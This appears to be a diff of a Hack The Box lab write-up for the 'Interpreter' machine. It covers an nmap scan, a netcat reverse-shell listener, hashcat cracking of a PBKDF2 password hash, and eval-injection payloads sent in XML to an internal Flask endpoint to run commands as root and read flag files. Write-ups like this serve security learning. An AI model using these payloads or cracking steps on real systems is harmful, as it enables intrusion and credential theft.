@@ -17,14 +17,14 @@ cover: /mc/images/mirth.png
 
 In this write-up, we will walk through the steps to hack the interpreter machine on Hack The Box. Let's dive in!
 
-# Recon
+## Recon
 
 We began by performing an **Nmap** scan to identify open ports and services on the target machine.
 
 ```bash
-nmap 10.129.1.159 -A -T5
+nmap 10.129.1.XXX -A -T5
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-21 20:49 -0500
-Nmap scan report for 10.129.1.159
+Nmap scan report for 10.129.1.XXX
 Host is up (0.051s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT    STATE SERVICE  VERSION
@@ -50,11 +50,6 @@ OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linu
 OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
 Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 1720/tcp)
-HOP RTT      ADDRESS
-1   49.98 ms 10.10.14.1
-2   50.91 ms 10.129.1.159
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 23.86 seconds
@@ -85,7 +80,7 @@ after that we're gonna get the shell with nc
 ```bash
 nc -vlntp 1234
 listening on [any] 1234 ...
-connect to [10.10.14.142] from (UNKNOWN) [10.129.1.155] 44402
+connect to [10.10.XX.XX] from (UNKNOWN) [10.129.1.XXX] 44402
 bash: cannot set terminal process group (3496): Inappropriate ioctl for device
 bash: no job control in this shell
 mirth@interpreter:/usr/local/mirthconnect$
@@ -111,32 +106,65 @@ ID      USERNAME        PASSWORD
 2       sedric  u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
 ```
 
-I tried to crack this password but no hope , uncrackable :(
+I tried to crack this password using a Hashcat but it was painful 
+
+```bash
+blob='u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=='
+hex=$(echo "$blob" | base64 -d | xxd -p -c 999)
+
+# try split A (salt first 8 bytes, hash rest)
+saltA=$(echo "$hex" | cut -c1-16 | xxd -r -p | base64)
+hashA=$(echo "$hex" | cut -c17- | xxd -r -p | base64)
+echo "sha256:600000:$saltA:$hashA" > hA.txt
+hashcat -m 10900 -a 0 hA.txt /usr/share/wordlists/rockyou.txt --force
+
+sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
+Hash.Target......: sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD...Ld8Ps=
+Time.Started.....: Sun Feb 22 12:07:47 2026, (16 mins, 18 secs)
+Time.Estimated...: Sun Feb 22 12:24:05 2026, (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:       10 H/s (18.28ms) @ Accel:54 Loops:1000 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 9936/14344385 (0.07%)
+Rejected.........: 0/9936 (0.00%)
+Restore.Point....: 9828/14344385 (0.07%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:599000-599999
+Candidate.Engine.: Device Generator
+Candidates.#01...: boracay -> lovelyme
+Hardware.Mon.#01.: Util: 92%
+```
 
 ## Internal port enumeration
 
-we enumerate the ports to see if there are any open ports 
-
+so we found the password of the user sedric next we gonna see the ports that are open in the machine 
 
 ```bash 
-mirth@interpreter:/usr/local/mirthconnect$ ss -nltp
-State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                          
-LISTEN 0      256          0.0.0.0:6661       0.0.0.0:*    users:(("java",pid=3496,fd=335))
-LISTEN 0      50           0.0.0.0:80         0.0.0.0:*    users:(("java",pid=3496,fd=327))
-LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                    
-LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                    
-LISTEN 0      50           0.0.0.0:443        0.0.0.0:*    users:(("java",pid=3496,fd=331))
-LISTEN 0      128        127.0.0.1:54321      0.0.0.0:*                                    
-LISTEN 0      128             [::]:22            [::]:*
+ssh sedric@10.129.2.121
+sedric@10.129.2.121's password: #snowflake1
+sedric@interpreter:~$ ss -nltp
+State              Recv-Q             Send-Q                         Local Address:Port                            Peer Address:Port             Process             
+LISTEN             0                  128                                127.0.0.1:54321                                0.0.0.0:*                                    
+LISTEN             0                  80                                 127.0.0.1:3306                                 0.0.0.0:*                                    
+LISTEN             0                  256                                  0.0.0.0:6661                                 0.0.0.0:*                                    
+LISTEN             0                  50                                   0.0.0.0:443                                  0.0.0.0:*                                    
+LISTEN             0                  128                                  0.0.0.0:22                                   0.0.0.0:*                                    
+LISTEN             0                  50                                   0.0.0.0:80                                   0.0.0.0:*                                    
+LISTEN             0                  128                                     [::]:22                                      [::]:*
 ```
 hmm a port like 54321 is suspicious , so I send an request  to see what on the earth is going on this internal port 
 
 ```bash
-timeout 3 bash -c "printf 'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n' | nc 127.0.0.1 54321 -nv" 2>&1 | head -n 40
-
+sedric@interpreter:~$ timeout 3 bash -c "printf 'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n' | nc 127.0.0.1 54321 -nv" 2>&1 | head -n 40
+(UNKNOWN) [127.0.0.1] 54321 (?) open
 HTTP/1.1 404 NOT FOUND
 Server: Werkzeug/2.2.2 Python/3.11.2
-Date: Sun, 22 Feb 2026 03:14:38 GMT
+Date: Sun, 22 Feb 2026 17:39:17 GMT
 Content-Type: text/html; charset=utf-8
 Content-Length: 207
 Connection: close
@@ -151,82 +179,63 @@ Connection: close
 
 hmm a Werkzeug server and python3
 
+### Identify process behind 54321
 after having this information we gonna try to see what process behind this port 
 
 ```bash 
-# 3) Identify process behind 54321
-# 3) Identify process behind 54321
-ps -ef | grep -Ei "python|werkzeug|54321" | grep -v grep
-
-mirth@interpreter:/usr/local/mirthconnect$ ps -ef | grep -Ei "python|werkzeug|54321" | grep -v grep
-<f | grep -Ei "python|werkzeug|54321" | grep -v grep
-root        3461       1  0 19:48 ?        00:00:04 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
-root        3508       1  0 19:48 ?        00:00:01 /usr/bin/python3 /usr/local/bin/notif.py
+sedric@interpreter:~$ ps -ef | grep -Ei "python|werkzeug|54321" | grep -v grep
+root        3559       1  0 11:41 ?        00:00:01 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+root        3565       1  0 11:41 ?        00:00:00 /usr/bin/python3 /usr/local/bin/notif.py
 ```
 
 ## Endpoint discovery: /addPatient
 
-so we got fail2ban script and notif.py script , the problem is that we don't have any
-after a hint from a friend, who told me that there is an endpoint called /addPatient that accept XML
-I tried to add a patient with this XML to see if it works or not 
+so we got fail2ban script and notif.py script , first we gonna read the notif.py script and see if we can get any information 
+for Escalation 
 
+```python
+sedric@interpreter:~$ cat /usr/local/bin/notif.py
 
-```XML
-<patient>
-  <timestamp>20250101000001</timestamp>
-  <sender_app>Me</sender_app>
-  <id>4444</id>
-  <firstname>Someone</firstname>
-  <lastname>was</lastname>
-  <birth_date>09/09/1999</birth_date>
-  <gender>F</gender>
-</patient>
+    except:
+        return "[INVALID_DOB]"
+    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
+    try:
+        return eval(f"f'''{template}'''")
+    except Exception as e:
+        return f"[EVAL_ERROR] {e}"
+
 ```
+it builds an f-string template with user-controlled fields (`first`, `last`, `sender`, `ts`, `gender`) and then executes it with `eval()`.
 
-so we're gonna create a one-line Python script that creates this 
+this is the root cause: the script evaluates user-controlled data inside an f-string, which leads to code execution. 
+
+also we discover an new endpoint addPatient that accept Post Request and the tags that we gonna use to send the request
+```python
+@app.route("/addPatient", methods=["POST"])
+-----
+data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
+notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
+```
+with these information of tags we gonna test if the request we gonna use it works or not 
+
+with these information of tags we're gonna create a one-line Python script that creates this 
 ```bash
-python3 -c 'import requests;u="http://127.0.0.1:54321/addPatient";x="<patient><timestamp>20250101000001</timestamp><sender_app>Me</sender_app><id>4444</id><firstname>Someone</firstname><lastname>was</lastname><birth_date>09/09/1999</birth_date><gender>M</gender></patient>";r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8);print(r.status_code);print(r.text)'
+sedric@interpreter:~$ python3 -c 'import requests;u="http://127.0.0.1:54321/addPatient";x="<patient><timestamp>20250101000001</timestamp><sender_app>Me</sender_app><id>4444</id><firstname>Someone</firstname><lastname>was</lastname><birth_date>09/09/1999</birth_date><gender>M</gender></patient>";r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8);print(r.status_code);print(r.text)'
 
 Patient Someone was (M), 27 years old, received from Me at 20250101000001
 ```
 
 ## Exploitation (eval injection)
 
-this is gonna create a patient so we're gonna try if we could inject our payload in the XML code as we did in the first on the CVE
-
-so we're gonna start inject our first payload 
-
-```python
-import("os").popen("id").read()
-```
-
-we're gonna use the same command we create the patient 
-```bash
-python3 - <<'PY'
-import requests
-u="http://127.0.0.1:54321/addPatient"
-p='{import("os").popen("id").read()}'
-x=f"<patient><timestamp>20250101120000</timestamp><sender_app>TEST</sender_app><id>12345</id><firstname>{p}</firstname><lastname>Doe</lastname><birth_date>01/01/1990</birth_date><gender>M</gender></patient>"
-r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8)
-print(r.text)
-PY
-[EVAL_ERROR] f-string: invalid syntax (<string>, line 1)
-```
-
-the payload returns eval syntax error :
-[EVAL_ERROR] f-string: invalid syntax
-that proves a f-string-like eval path 
-
-so after correcting the python payload we're gonna use this
+after successfully create  a patient, we're gonna inject our payload in the XML code as we did in the first on the CVE
 
 ```xml
 <firstname>{__import__("os").popen("id").read()}</firstname>
 ```
-
-so the output is gonna be like this 
+full payload:
 
 ```bash
-python3 - <<'PY'
+sedric@interpreter:~$ python3 - <<'PY'
 import requests
 u="http://127.0.0.1:54321/addPatient"
 p='{__import__("os").popen("id").read().strip()}'
@@ -243,8 +252,7 @@ r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8)
 print(r.text)
 PY
 
-Patient uid=0(root) gid=0(root) groups=0(root)
-Doe (M), 36 years old, received from TEST at 20250101120000
+Patient uid=0(root) gid=0(root) groups=0(root) was (F), 27 years old, received from Me at 20250101000001
 ```
 
 as we can see, we successfully executed the id command 
@@ -254,7 +262,7 @@ as we can see, we successfully executed the id command
 so all that remains is to read the flag files and that's easy just by modifying the payload page
 
 ```bash
-python3 - <<'PY'
+sedric@interpreter:~$ python3 - <<'PY'
 import requests
 u="http://127.0.0.1:54321/addPatient"
 p='{__import__("builtins").open(chr(47)+"root"+chr(47)+"root.txt").read().strip()}'
@@ -271,7 +279,7 @@ r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8)
 print(r.text)
 PY
 
-Patient 7a6af1XXXXXXXXXXXXXXXXXXX Doe (M), 36 years old, received from TEST at 20250101120000
+Patient 7a6af1XXXXXXXXXXXXXXXXXXX Doe (M), 36 years old, received from Me at 20250101000001
 ```
 
 for the user flag, all you need to do is change the payload 
@@ -283,4 +291,4 @@ to this payload
 __import__("builtins").open(chr(47)+"home"+chr(47)+"sedric"+chr(47)+"user.txt").read().strip()
 ```
 Note:
-I tried many times to get the shell code , but all I got is 200 [INVALID_INPUT]
+I tried many times to get the root shell  , but all I got is 200 [INVALID_INPUT]
